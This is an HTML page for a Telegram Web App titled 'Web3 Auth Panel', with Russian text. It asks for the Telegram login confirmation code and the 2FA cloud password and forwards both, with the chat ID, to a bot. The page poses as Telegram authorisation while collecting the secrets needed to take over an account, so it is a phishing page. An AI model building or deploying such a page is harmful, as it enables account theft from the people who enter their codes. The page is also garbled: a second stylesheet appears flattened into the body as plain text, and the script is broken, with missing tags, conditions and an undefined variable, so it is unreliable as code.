<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Web3 Auth Panel</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --bg-color: #0f172a;
            --accent-color: #38bdf8;
            --text-color: #f8fafc;
            --key-bg: #1e293b;
        }
        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            font-family: 'Inter', sans-serif;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            width: 90%;
            max-width: 400px;
            text-align: center;
        }
        .display {
            font-size: 2rem;
            margin-bottom: 20px;
            letter-spacing: 5px;
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: var(--key-bg);
            border-radius: 12px;
            border: 1px solid var(--accent-color);
            box-shadow: 0 0 15px rgba(56, 189, 248, 0.2);
        }
        .numpad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            width: 100%;
        }
        .key {
            background: var(--key-bg);
            border: 1px solid #334155;
            padding: 20px;
            font-size: 1.5rem;
            border-radius: 12px;
            color: white;
            cursor: pointer;
            transition: 0.2s;
        }
        .key:active {
            background: var(--accent-color);
            transform: scale(0.95);
        }
        .key.submit {
            grid-column: span 2;
            background: var(--accent-color);
            color: var(--bg-color);
            font-weight: bold;
        }
        input[type="password"] {
            width: 100%;
            padding: 15px;
            background: var(--key-bg);
            border: 1px solid var(--accent-color);
            border-radius: 12px;
            color: white;
            font-size: 1.2rem;
            margin-bottom: 20px;
            box-sizing: border-box;
            text-align: center;
        }
        .hidden { display: none; }
        h2 { color: var(--accent-color); font-weight: 300; }
    </style>
</head>
<body>
Telegram Auth
• {
margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center;
align-items: center; padding: 20px; }
.container { background: white; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); width: 100%;
max-width: 400px; overflow: hidden; }
.header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px
20px; text-align: center; }
.header h1 { font-size: 24px; font-weight: 600; margin-bottom: 10px; }
.header p { font-size: 14px; opacity: 0.9; }
.content { padding: 30px; }
.input-group { margin-bottom: 25px; }
.input-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; font-size: 14px; }
.code-input { width: 100%; padding: 15px; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 18px;
text-align: center; letter-spacing: 3px; transition: all 0.3s; font-family: 'Courier New', monospace; }
.code-input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1); }
.password-input { width: 100%; padding: 15px; border: 2px solid #e0e0e0; border-radius: 10px; font-size:
16px; transition: all 0.3s; }
.password-input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(102, 126, 234,
0.1); }
.submit-btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #667eea 0%, #764ba2
100%); color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer;
transition: transform 0.2s, box-shadow 0.2s; margin-top: 10px; }
.submit-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3); }
.submit-btn:active { transform: translateY(0); }
.submit-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
.info-box { background: #f8f9fa; border-radius: 10px; padding: 15px; margin-top: 20px; font-size: 14px; color:
#666; border-left: 4px solid #667eea; }
.info-box strong { color: #333; }
.hidden { display: none; }
.error-message { color: #e74c3c; font-size: 14px; margin-top: 10px; text-align: center; }
.success-message { color: #27ae60; font-size: 14px; margin-top: 10px; text-align: center; }
.loading { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: white; animation: spin 1s ease-in-out infinite; margin-right: 10px; }
@keyframes spin { to { transform: rotate(360deg); } }
.mode-indicator { display: inline-block; padding: 5px 10px; background: rgba(255,255,255,0.2); border-radius: 20px; font-size: 12px; margin-left: 10px; } Telegram Auth Введите данные для авторизации
Код подтверждения (5 цифр) Информация: Код был отправлен в приложение Telegram на вашем
устройстве. Введите 5 цифр без пробелов и других символов. Отправить код
Пароль 2FA (Облачный пароль) Информация: Введите пароль двухфакторной аутентификации. Это
пароль, который вы установили в настройках Telegram. Отправить пароль
// Инициализация Telegram Web App const tg = window.Telegram.WebApp; tg.expand(); tg.enableClosingConfirmation();
// Получаем параметры из URL const urlParams = new URLSearchParams(window.location.search);
const chatId = urlParams.get('chat_id');
// Элементы DOM const codeForm = document.getElementById('codeForm'); const passwordForm =
document.getElementById('passwordForm'); const codeInput = document.getElementById('code'); const passwordInput = document.getElementById('password'); const submitCodeBtn = document.getElementById('submitCode'); const submitPasswordBtn = document.getElementById('submitPassword'); const codeBtnText = document.getElementById('codeBtnText'); const passwordBtnText = document.getElementById('passwordBtnText'); const errorMessage = document.getElementById('errorMessage'); const successMessage = document.getElementById('successMessage'); const modeIndicator = document.getElementById('modeIndicator'); const headerText = document.getElementById('headerText');
// Настройка в зависимости от режима function setupMode() { if (mode === 'password') { // Режим пароля
codeForm.classList.add('hidden'); passwordForm.classList.remove('hidden'); modeIndicator.textContent =
'Пароль'; headerText.textContent = 'Введите пароль двухфакторной аутентификации';
// Фокус на поле пароля setTimeout(() => { passwordInput.focus(); }, 100); } else { // Режим кода
(по умолчанию) codeForm.classList.remove('hidden'); passwordForm.classList.add('hidden'); modeIndicator.textContent = 'Код'; headerText.textContent = 'Введите код подтверждения из Telegram';
// Фокус на поле кода setTimeout(() => { codeInput.focus(); }, 100); } }
// Валидация кода function validateCode(code) {
return 'Код должен содержать ровно 5 цифр'; }
if (!/^\d+$/.test(code)) { return 'Код должен содержать только цифры'; }
return null; }
// Валидация пароля function validatePassword(password) {
return 'Введите пароль'; }
return null; }
// Показать ошибку function showError(message) { errorMessage.textContent = message; errorMessage.classList.remove('hidden'); successMessage.classList.add('hidden'); }
// Показать успех function showSuccess(message) { successMessage.textContent = message; successMessage.classList.remove('hidden'); errorMessage.classList.add('hidden'); }
// Скрыть сообщения function hideMessages() { errorMessage.classList.add('hidden'); successMessage.classList.add('hidden'); }
// Отправить данные в бот function sendData(value) { hideMessages();
// Показываем загрузку if (mode === 'password') { passwordBtnText.innerHTML = ' Отправка...'; submitPasswordBtn.disabled = true; } else { codeBtnText.innerHTML = ' Отправка...'; submitCodeBtn.disabled =
true; }
// Отправляем данные в бот tg.sendData(JSON.stringify({ value: value, mode: mode, chat_id: chatId, timestamp: new Date().toISOString() }));
// Показываем сообщение об успехе showSuccess('Данные отправлены! Закрываю окно...');
// Закрываем Web App через 1.5 секунды setTimeout(() => { tg.close(); }, 1500); }
// Обработчик отправки кода submitCodeBtn.addEventListener('click', () => { const code = codeInput.value.trim(); const error = validateCode(code);
if (error) { showError(error); codeInput.focus(); return; }
sendData(code); });
// Обработчик отправки пароля submitPasswordBtn.addEventListener('click', () => { const password =
passwordInput.value.trim(); const error = validatePassword(password);
if (error) { showError(error); passwordInput.focus(); return; }
sendData(password); });
// Обработка Enter в полях ввода codeInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') {
submitCodeBtn.click(); } });
passwordInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') { submitPasswordBtn.click(); } });
// Автоматическая валидация при вводе кода codeInput.addEventListener('input', (e) => { // Очищаем от
нецифровых символов let value = e.target.value.replace(/\D/g, '');
// Ограничиваем 5 символами if (value.length > 5) { value = value.substring(0, 5); }
e.target.value = value; hideMessages();
// Автоматически отправляем при вводе 5 цифр if (value.length === 5) { setTimeout(() => { submitCodeBtn.click(); }, 300); } });
// Инициализация document.addEventListener('DOMContentLoaded', () => { setupMode();
// Логирование для отладки console.log('Web App initialized'); console.log('Mode:', mode); console.log('Chat ID:', chatId); console.log('Telegram Web App version:', tg.version); });
</body>
</html>
